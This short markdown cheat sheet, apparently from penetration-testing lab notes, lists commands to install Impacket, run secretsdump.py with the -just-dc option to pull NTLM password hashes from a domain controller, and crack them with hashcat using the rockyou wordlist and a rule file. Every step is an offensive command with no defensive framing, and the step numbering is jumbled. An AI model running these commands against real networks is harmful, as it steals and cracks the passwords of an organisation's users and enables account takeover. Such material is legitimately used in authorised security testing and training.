### **USING IMPACKET SECRETSDUMP.PY**

1. Update Package List
    `sudo apt-get update`
2. Install Python3-Pip
    `sudo apt-get install python3-pip`
5. Install Impacket
    `pip3 install impacket`
1. Extract Hashes
    	`secretsdump.py -outputfile inlanefreight_hashes -just-dc EXAMPLE/[USERNAME]:[PASSWORD]@[IP_ADDRESS]`
1. Install Hashcat
	`sudo apt-get install hashcat`
3.  Crack NTLM Hashes
	`hashcat -m 1000 -a 0 example_hashes.ntds /usr/share/wordlists/rockyou.txt`
	`hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`